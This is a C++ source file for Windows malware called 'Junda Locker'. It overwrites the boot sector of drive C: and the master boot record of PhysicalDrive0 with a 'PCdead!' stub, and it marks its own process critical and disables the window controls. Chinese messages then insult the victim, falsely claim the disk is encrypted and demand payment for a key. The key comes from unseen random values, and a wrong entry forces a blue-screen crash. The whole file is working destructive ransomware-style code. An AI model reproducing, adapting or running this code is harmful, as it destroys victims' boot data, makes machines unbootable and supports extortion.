#include <cstdlib>
#include <winternl.h>
#include <string>
#include <comdef.h>
#include <Wbemidl.h>
#include <ctime> 
#include <windows.h>
#include <iostream>
#include <cstdlib>
#include <mmsystem.h>
#include <thread>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <comdef.h>
#include <conio.h>
#pragma comment(lib, "mmdevapi.lib")
#include "resource.h"
#define size 512
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "winmm.lib") 
#pragma warning(disable : 4996) 
using namespace std;
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
bool Privilege()
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		return   false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
	{
		CloseHandle(hToken);
		return false;
	}
	return true;
}

typedef NTSTATUS(__cdecl* fnRtlSetProcessIsCritical)(IN  BOOLEAN  NewValue, OUT PBOOLEAN OldValue OPTIONAL, IN  BOOLEAN  CheckFlag);
fnRtlSetProcessIsCritical pRtlSetProcessIsCritical;
void playSoundThread()
{
	HINSTANCE hInst = GetModuleHandle(NULL);
	PlaySound(MAKEINTRESOURCE(IDR_WAVE1), hInst, SND_RESOURCE | SND_ASYNC | SND_LOOP);
}
void SetSystemVolumeToMax()
{
	HRESULT hr;
	IMMDeviceEnumerator* deviceEnumerator = nullptr;
	IMMDevice* defaultDevice = nullptr;
	IAudioEndpointVolume* endpointVolume = nullptr;

	try
	{
		CoInitializeEx(nullptr, COINIT_MULTITHREADED);

		hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), nullptr, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator);
		if (FAILED(hr))
		{
			/*throw std::runtime_error("Failed to create device enumerator.");*/
		}

		hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
		if (FAILED(hr))
		{
			/*throw std::runtime_error("Failed to get default audio endpoint.");*/
		}

		hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, nullptr, (LPVOID*)&endpointVolume);
		if (FAILED(hr))
		{
			/*throw std::runtime_error("Failed to activate endpoint volume.");*/
		}

		BOOL isMuted = FALSE;
		hr = endpointVolume->GetMute(&isMuted);
		if (FAILED(hr))
		{
			/*throw std::runtime_error("Failed to get mute state.");*/
		}
		if (isMuted)
		{
			hr = endpointVolume->SetMute(FALSE, nullptr);
			if (FAILED(hr))
			{
				/*throw std::runtime_error("Failed to set unmute.");*/
			}
		}

		float maxVolume = 100.0f;
		hr = endpointVolume->SetMasterVolumeLevelScalar(maxVolume / 100.0f, nullptr);
		if (FAILED(hr))
		{
			/*throw std::runtime_error("Failed to set volume.");*/
		}
	}
	catch (const std::exception& e)
	{
		/*std::cerr << "Error: " << e.what() << std::endl;*/
	}

	if (endpointVolume) endpointVolume->Release();
	if (defaultDevice) defaultDevice->Release();
	if (deviceEnumerator) deviceEnumerator->Release();

	CoUninitialize();
}
void setGreenColor() {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
}
int main(void) {

	Privilege();
	int a, r;
	FILE* DiskFile;
	FILE* CDiskFile;
	FILE* File;
	unsigned char DiskCode[] = { 0xB4,0x00,0xB0,0x12,0xCD,0x10,0x8C,0xC8,0x8E,0xD8,0x8E,0xC0,0xB4,0x13,0xB0,0x00,0xB7,0x00,0xB3,0x0F,0xB6,0x00,0xB2,0x00,0xBA,0x00,0x00,0xB3,0x4F,0xB8,0x2C,0x7C,0x89,0xC5,0xB9,0x07,0x00,0xB8,0x00,0x13,0xCD,0x10,0xFA,0xF4,0x50,0x43,0x64,0x65,0x61,0x64,0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA };
	unsigned char MBRCODE[size] = { 0 };
	unsigned char CdiskCODE[size] = { 0 };
	CDiskFile = fopen("\\\\.\\C:", "rb+");
	if (!CDiskFile)
		puts("Can't open file!");
	else if (!feof(CDiskFile))
	{
		fseek(CDiskFile, 0, SEEK_SET);
		fread(CdiskCODE, 1, size, CDiskFile);
		fseek(CDiskFile, 0, SEEK_SET);
		fwrite(DiskCode, size, 1, CDiskFile);
		fclose(CDiskFile);
	}
	DiskFile = fopen("\\\\.\\PhysicalDrive0", "rb+");
	if (!DiskFile)
		puts("Can't open file!");
	else if (!feof(DiskFile))
	{
		fseek(DiskFile, 0, SEEK_SET);
		fread(MBRCODE, 1, size, DiskFile);
		fseek(DiskFile, 0, SEEK_SET);
		fwrite(DiskCode, size, 1, DiskFile);
		fclose(DiskFile);
	}
	HMODULE  hNtdll = GetModuleHandle(TEXT("ntdll.dll"));
	if (hNtdll)
	{
		pRtlSetProcessIsCritical = (fnRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
		if (pRtlSetProcessIsCritical)
		{
			pRtlSetProcessIsCritical(TRUE, NULL, FALSE);
		}
	}
	srand(time(0));

	int r1 = rand() % 5000 + 1;
	int r2 = rand() % 5000 + 1;

	double key = (r1 - 80) + (567.0 / 31) * 34;
	key *= sin(r2 / 100.0);  
	key += cos(r1 / 100.0);  
	key /= (sqrt(r2) + 1);   
	key = floor(key);        
	setGreenColor();
	SetConsoleTitle(TEXT("Junda Locker"));
	string asciiArt = R"(
@@@@@@@@@@@@@@@@%:......::-=***********####################*************+=::.......:%@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@+.......:-=+**********#####################**************+-:....... +@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%......::-=+**************###################*************++-:.......-@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@*.....:::=+*************#####################***************+=:......:%@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@#:....:-+*****+++++***########################****++++********=::.....#@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%:...:=****+===========+****############***++============+******-.....*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%:...-*****+++*****+++===++***########***++=====+++++++++++*****+:....-@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%:...=*********########********######**********#######***********:....=@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@#...:+*********++*+====*********#####*******++====++++***********-....*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%=:.:+******+===+#=. :-*++******#####******++*-. :=*=-=++********=...-#@@@@@@@@@@@@@@
@@@@@@@@@@@@@@%%*:.:**************+==***+******#####******+***==+***************=.:-+++*@@@@@@@@@@@@
@@@@@@@@@@@@%+==+=.:**************###****##****#####***********##***************=.=**+==*@@@@@@@@@@@
@@@@@@@@@@@@#==+*+::**********##############***#####****#####***###*************=:+***+++@@@@@@@@@@@
@@@@@@@@@@@@#++***=:*****####################*######****###############*********=:=+***+*@@@@@@@@@@@
@@@@@@@@@@@@%++**+=:+****##################***#######****###############********-===++*+%@@@@@@@@@@@
@@@@@@@@@@@@@***+====*****###############*****#######*****##############*******+=**+==*#@@@@@@@@@@@@
@@@@@@@@@@@@@%**+=+*=******############*******#######*******###########********+=+*+++*#@@@@@@@@@@@@
@@@@@@@@@@@@@@#**+**++******###########*+*****************+**########**********++******@@@@@@@@@@@@@
@@@@@@@@@@@@@@@*++***+********########**+***=--+++++--+***+**#####*************+****+*%@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@#*+**+**********#######***++==+++++++==++*****#####*****************#@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@%***+************##*###************+*****######*************++**%@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@##****************###*************************************%%@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@******************************************************%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@***************+++++++++++++++++++++****************#@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@*+**********++===========----======++***********++#@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@#+++++++***+++++++******+***+++++++++*****++++++%@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@%++++++++++**++++++++++++++++++***++++++++++++%@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@*++++++++++++++++=========++++++++++++++++++*@@@@@@@@@@@@@@@@@@@@@@@@@@@
)";
	SetSystemVolumeToMax();
	thread soundThread(playSoundThread);
	HWND hwnd = GetConsoleWindow();
	HMENU hmenu = GetSystemMenu(hwnd, false);
	RemoveMenu(hmenu, SC_CLOSE, MF_BYCOMMAND);
	LONG style = GetWindowLong(hwnd, GWL_STYLE);
	style &= ~(WS_MINIMIZEBOX);
	SetWindowLong(hwnd, GWL_STYLE, style);
	SetWindowPos(hwnd, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
	ShowWindow(hwnd, SW_SHOWNORMAL);
	DestroyMenu(hmenu);
	ReleaseDC(hwnd, NULL);
	cout << asciiArt;
	cout << "傻逼东西" << endl;
	cout << "叫你开挂" << endl;
	cout << "你的整个磁盘都被你大爹程鋆达加密了" << endl;
	cout << "赶紧给我打钱让我开宝马获取密钥!" << endl;
	/*cout << "随机码：" << r << endl;*/
	cout << "密钥:";
	cin >> a;
	if (a == key)
	{
		FILE* DiskFile;
		FILE* CDiskFile;
		FILE* File;
		CDiskFile = fopen("\\\\.\\C:", "rb+");
		if (!CDiskFile)
			puts("Can't open file!");
		else if (!feof(CDiskFile))
		{
			fseek(CDiskFile, 0, SEEK_SET);
			fwrite(CdiskCODE, size, 1, CDiskFile);
			fclose(CDiskFile);
		}
		DiskFile = fopen("\\\\.\\PhysicalDrive0", "rb+");
		if (!DiskFile)
			puts("Can't open file!");
		else if (!feof(DiskFile))
		{
			fseek(DiskFile, 0, SEEK_SET);
			fwrite(MBRCODE, size, 1, DiskFile);
			fclose(DiskFile);
		}
		cout << "密钥正确，恢复完成！" << endl;
		if (pRtlSetProcessIsCritical)
		{
			pRtlSetProcessIsCritical(FALSE, NULL, FALSE);
		}
		_getch();
	}
	else
	{
		cout << "密钥错误,你死定了!" << endl;
		BOOLEAN bEnabled;
		ULONG uResp;
		LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
		LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
		pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
		pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
		NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
		NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
	}

	return 0;
}
